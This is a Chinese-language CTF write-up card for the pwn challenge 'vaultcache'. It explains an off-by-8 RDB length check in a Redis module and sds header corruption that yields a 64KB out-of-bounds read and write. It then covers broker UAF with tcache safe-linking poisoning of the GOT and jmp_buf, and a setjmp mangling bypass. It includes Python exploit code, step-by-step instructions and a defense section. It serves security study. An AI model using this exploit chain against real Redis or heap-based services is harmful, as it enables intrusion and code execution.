---
id: ctf-pwn-vaultcache-redis-module-rdb-off-by-8-sds-oob
title: vaultcache：Redis 模块 RDB 长度 off-by-8 破坏相邻 sds 头得到 64KB OOB，broker tcache 投毒与 jmp_buf 校验绕过转接 ledger
type: scenario
domain: ctf
path: ctf/pwn
technique: redis-module-rdb-load-off-by-8-sds-header-corruption
tags:
- pwn
- ctf
- redis
- module
- rdb
- off-by-8
- sds
- heap-grooming
- tcache
- safe-linking
- setjmp
- longjmp
- broker
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V118
  verified_at: '2026-11-06T01:56:12+08:00'
  notes: 已对照原文核对；rdb_load 0x2FF..0x307 与 8 字节溢出、762 字节 sds 头、broker tcache/jmp_buf 绕过、ledger/council 复用一致
url: /docs/ctf/pwn/ctf-pwn-vaultcache-redis-module-rdb-off-by-8-sds-oob/
draft: false
kb_aliases:
- vaultcache
- Redis 模块 RDB 溢出
- rdb_load 长度 off-by-8
- sds 头破坏
- 64KB OOB
- vaultbroker
- tcache 投毒槽位数组
- setjmp jmp_buf 校验绕过
- longjmp 转接
---

## 一句话结论

vaultcache 的入口是 Redis 模块 `rdb_load`：保存字符串的长度检查允许 `0x2FF..0x307`，但模块实际只按约 0x2FF 分配/复制，形成固定 8 字节堆溢出。用堆 groom 让被 RESTORE 的记录数据块紧挨在 `s1x` 的 sds 头之前，8 字节溢出把 sds 的 `len/alloc` 改成 0xffff、`flags` 改成 SDS_TYPE_16，`GET s1x` 返回 65535 字节、`SETRANGE` 获得 64KB 越界写；随后改模块记录的 `data/fptr` 接到 vaultbroker，再用 broker 的槽位 UAF + tcache safe-linking 投毒改 `GOT(read)` 泄露 libc、绕过 `setjmp` 的指针 mangling 校验并 longjmp 到 relay，接上 routeledger/routecouncil 读 flag。

## 原理

- **RDB 长度检查 off-by-8**：模块 `rdb_load` 对保存字符串的长度检查是 `if (n[0] < 0x2FF || n[0] > 0x2FF + 8) fail;`，即允许最多 `0x307`，但模块实际只按 `0x2FF` 左右申请/复制，最后多写最多 8 字节。这是“检查上界比实际分配大 8”的典型 off-by-one 家族漏洞。
- **RDB 模块流格式**：需要 `0x07`（模块 ID 长度）+ 16 字节模块 ID `8155aba5b5179cb000` + `0x02`（UINT opcode，保存长度）+ `0x05`（STRING opcode，保存数据）+ 数据 + `0x00`（EOF）+ Redis CRC64（反射多项式 `0x95AC9329AC4BC9B5`，小端 8 字节尾）；只拼字符串会导致 `RESTORE` 直接崩溃。
- **相邻 sds 头**：Redis 字符串 `s1x` 用 `SET s1x <762字节>` 创建时，sds 实际分配落在 768 字节类（用 768 字节会落到 896 类，必须用 762）；模块记录的数据块也是 768 类。堆 groom 让“被 RESTORE 的记录数据块”紧挨在 `s1x` 的 sds 之前，8 字节溢出正好落到 sds 头：`len=0xffff`、`alloc=0xffff`、`flags=0x02`（SDS_TYPE_16），之后 `GET s1x` 按 0xffff 长度返回 65535 字节，`SETRANGE s1x <off> <data>` 也能越界写 64KB。
- **堆 groom**：远程堆被多次探测后已碎片化，直接 `PUT r0 -> SET s1 -> DEL r0 -> RESTORE` 不稳定。稳定做法：先创建 64 个 768 字节 filler 记录消耗空闲 768 类块；`VAULT.PUT pad <768>` 从 top 分配 header/data；`SET s1x <762>` 让 sds 紧跟 pad 的 data；`DEL pad` 释放 pad 的 data/header；`RESTORE key1 ...` 让 rdb_load 的 header/data 复用刚释放的 pad 块，data 正好在 s1 前面；8 字节溢出写入 s1 的 sds 头。
- **泄露模块记录并改 fptr**：溢出成功后创建 4 个不同长度的记录（768/800/1024/1280），从 `GET s1x` 的 64KB 数据里按字节扫描记录头：`q0==q1`、`768<=q0<=2048`、`(q3 & 0xFFF)==0x1E0`（默认 fptr 低 12 位）；由 `q4`（self）与泄露偏移算 base，`modbase=fptr-0x81E0`、`relay=modbase+0x8940`。先用 `VAULT.RENDER rt768x` 读一次，响应偏移 96 处带出当前 Redis 客户端指针；再用 `SETRANGE` 把目标记录的 `data` 改成 client、`fptr` 改成 relay；`VAULT.RENDER rt768x` 调用 `sub_8940(client)`，经 `client+16 -> conn+16 -> fd` 取出客户端 fd，与 `/tmp/vault-broker.sock` 建连，收到 `VLTB3\n`。
- **broker 槽位 UAF**：每帧 `opcode(1) | length(4 BE) | payload`；`C` 创建槽位（`kind=3` 分配 0x330，`kind=0` 按数据长度），`F` 只释放底层块、不清槽位指针和 R/E 标志，因此 free 后仍可 `R`/`E`。槽位数组在 `base+0x5040`，每槽 32 字节：`ptr/size/alloc/r/e`。稳定布局 `s=A, s0=A+0x340, ptr=A+0x680, ptr0=A+0x9C0, s1=A+0xDA0`，其中 `s1` 保存 `jmp_buf`。
- **Stage A 泄露堆地址**：create 0/1 两个 0x330，free 两个；读 slot0 的 fd 得 `fdA`，`A=(fdA<<12)|0x860`、`B=A+0x340`、`s1=B-0xB60`、`s0=s1-0xA60`。把 slot1 的 fd 改成 `s0^(B>>12)`（safe-linking 编码），再 create 0x330 的 slot2/3，使 slot3 的 ptr 落到 s0；读 `slot3+0x18` 得到 `base+0x1309`，减 0x1309 得 broker base。
- **Stage B tcache 投毒覆盖槽位数组**：create 两个 0x3D0 块 slot4/5，free 两个，读 slot4 的 fd；`fdC=read(4,0)`、`C=(fdC<<12)|(top&0xFFF)`、`D=C+0x3E0`；`write(5,0,p64((base+0x5040)^(D>>12)))`；再 create 两个块，第二次分配返回槽位数组地址，用 payload 写入伪造槽位：slot8 -> `base+0x4FE0`（GOT(read)），size 0x1000，r=1,e=0；slot9 -> `s1`（jmp_buf），size 0x3D0，r=1,e=1。`R 8 0` 读 GOT 里的 read 地址，`libc_read=...`、`libc=libc_read-0xF82A0`。
- **绕过 T 校验并 longjmp**：`T` 会检查 `check = ROL(s1 ^ (base+0x1309) ^ libc_read, 23) ^ 0x8B7D51E29AC4630F`；`setjmp` 保存的 RSP/RIP 是 pointer-mangled：`mangled=ROL(value ^ guard,17)`、`guard=ROR(mangled_saved_rip,17) ^ (base+0x2116)`。先读 `slot9+0x78` 得 mangled saved RIP，恢复 guard；写 `slot9+0x20=check`、`slot9+0x78=p64(rol((base+0x145A)^guard,17))`；发 `T` 后 longjmp 到 `sub_145A`（broker 连接 ledger 并转接的 relay）。
- **后续**：ledger/council 的二进制与 redisrelay 相同，直接复用 `ledger_lib.py`/`council_poc.py`：ledger 完成 ping/VM 泄露/key 恢复/manifest/permit/0x40 gate/0x60 隧道；council 完成 nonce/key 恢复、计划、permit、tcache、gate、`0x40` 读 fd4。注意 ledger 阶段已经用 council `0x7F` ping（seq=1），council 阶段要从 `seq_start=2` 开始。
- **坑点**：RDB 流必须带 0x02/0x05/0x00；sds 大小类用 762 而不是 768；tcache 投毒要先 free 两个再改第二个 fd；safe-linking 的 fd 要写 `target ^ (chunk_addr >> 12)`；longjmp 栈对齐 `RSP=chain_addr+8`；broker 与 council 不在同一 mount namespace，直接 open `/home/ctf/council.flag` 返回全 0，必须走协议链。

## 触发条件

- 目标为 Redis 模块 + 多级 broker/vault 的 CTF PWN 题或类似服务；模块有 RDB 反序列化 `rdb_load` 且长度检查与实际分配不一致。
- 能执行 `RESTORE`、`SET/GET/SETRANGE`、模块命令（`VAULT.PUT/RENDER` 等），并能构造带 CRC64 的 RDB 模块流。
- 堆布局可通过 filler/pad/释放/复用稳定 groom；能泄露堆/模块基址。
- broker 存在槽位 UAF、tcache 可投毒到槽位数组/GOT/jmp_buf；ledger/council 协议可复用或可逆向。

## 利用步骤

1. 构造 `make_payload(saved_len=0x300, blob=768+8字节)`，RDB 流带模块 ID、0x02/0x05/0x00 与 CRC64。
2. 按 groom 序列：64 个 768 filler → `VAULT.PUT pad 768` → `SET s1x 762` → `DEL pad` → `RESTORE key1 payload`；`GET s1x` 应返回 65535 字节。
3. 创建 4 个不同长度的记录，扫描 64KB 泄露找记录头，算 `modbase/relay`；`VAULT.RENDER` 泄露 client 指针；`SETRANGE` 改 data/fptr；`VAULT.RENDER` 触发 `sub_8940` 接到 broker，收到 `VLTB3\n`。
4. broker Stage A：free 两个 0x330，safe-linking 改 fd，create 0x330 让 slot3 指向 s0，读 slot3+0x18 得 base。
5. broker Stage B：free 两个 0x3D0，改 fd 指向槽位数组，create 两次返回数组，写伪造 slot8/slot9；读 GOT(read) 得 libc。
6. 恢复 guard，写 check 与 mangled RIP，发 `T` longjmp 到 `sub_145A`，连接 ledger。
7. 复用 `ledger_lib.py`/`council_poc.py` 完成 ledger gate、0x60 隧道、council 计划/permit/tcache/gate，`0x40` 读 fd4 拿 flag。

## PoC

RDB payload 与 sds 头破坏（按原文结构重写，未在本库复跑）：

```python
def make_payload(saved_len, blob):
    p  = b"\x07" + bytes.fromhex("8155aba5b5179cb000")
    p += b"\x02" + enc_len(saved_len)
    p += b"\x05" + enc_len(len(blob)) + blob
    p += b"\x00\x0b\x00"
    p += struct.pack("<Q", crc64(p))
    return p

for i in range(64):
    r.cmd("VAULT.PUT", f"fill{i}", b"F" * 768)
r.cmd("VAULT.PUT", "pad", b"P" * 768)
r.cmd("SET", "s1x", b"S" * 762)        # 762 -> sds 768 类
r.cmd("DEL", "pad")
r.cmd("RESTORE", "key1", "0",
      make_payload(0x300, b"A" * 768 + bytes.fromhex("ffffffff02414141")))
g = r.cmd("GET", "s1x")
assert len(g) == 65535
```

sds 头 8 字节布局：`len=0xffff`、`alloc=0xffff`、`flags=0x02`（SDS_TYPE_16）、剩余 padding。

broker Stage B 关键：

```python
fdC = u64(b.read(4, 0))
C   = (fdC << 12) | (top & 0xFFF)
D   = C + 0x3E0
b.write(5, 0, p64((base + 0x5040) ^ (D >> 12)))
payload[8*32:8*32+32] = slot(base + 0x4FE0, 0x1000, 1, 1, 0)  # GOT(read)
payload[9*32:9*32+32] = slot(s1, 0x3D0, 1, 1, 1)             # jmp_buf
b.create(6, 0, b"E" * 0x3D0)
b.create(10, 0, bytes(payload))
libc = u64(b.read(8, 0)) - 0xF82A0
```

## 变体与关联

- **长度检查变体**：`n[0] > 0x2FF+8` 这类“上界比实际分配大”的 off-by-N；同类还有 `<= size+8`、`len+1`、对齐补齐造成的堆溢出。
- **sds 头变体**：改 `len/alloc/flags` 把短字符串变成 64KB/更大；`flags` 选择 SDS_TYPE_8/16/32/64，需匹配目标堆布局。
- **broker 变体**：槽位 UAF + tcache safe-linking 投毒到槽位数组/GOT/jmp_buf；setjmp 指针 mangling 的 guard 可由 saved RIP 反推。
- **隧道复用**：ledger/council 与 redisrelay 相同，可直接复用协议库；注意 seq 接续。
- **关联卡片**：[[ctf-pwn-redis-module-multi-uid-chain-signed-index-tcache-tunnel]]（redisrelay 的六层链、负索引与隧道）、[[binary-pwn-heap-safe-linking-self-xor-heap-address]]（safe-linking 编码）、[[binary-pwn-heap-uaf-function-pointer-hijack]]（UAF 控制流劫持）。

## 检测与防御

- **RDB 解析**：保存字符串的长度检查必须与实际分配/复制长度一致；对 `rdb_load` 的每条记录做严格边界校验；不要信任 RDB 中的长度字段。
- **sds/字符串**：字符串操作使用安全 API，避免相邻 sds 头被越界写；对 `SETRANGE` 的目标长度做完整校验。
- **模块记录**：`data/fptr/self` 使用前校验指针范围与类型；`RENDER` 不要直接调用记录里的函数指针。
- **broker**：`F` 释放后清空槽位指针与 R/E 标志；tcache fd 不应能指向槽位数组/`.bss`/GOT；`setjmp` 保存区放只读/独立映射，校验值使用不可预测的进程级密钥。
- **隔离**：council 单独 mount namespace/最小权限；flag 只对 council 可读；禁止 `/proc/<pid>/root`、`/proc/<pid>/mem` 横向访问。
- **检测**：Redis 模块出现异常长度的 RDB 恢复、`GET` 返回 65535 字节、`SETRANGE` 越界；broker 出现槽位 free 后仍读写、tcache fd 指向非堆地址；进程出现 `longjmp` 到 relay 的异常控制流。
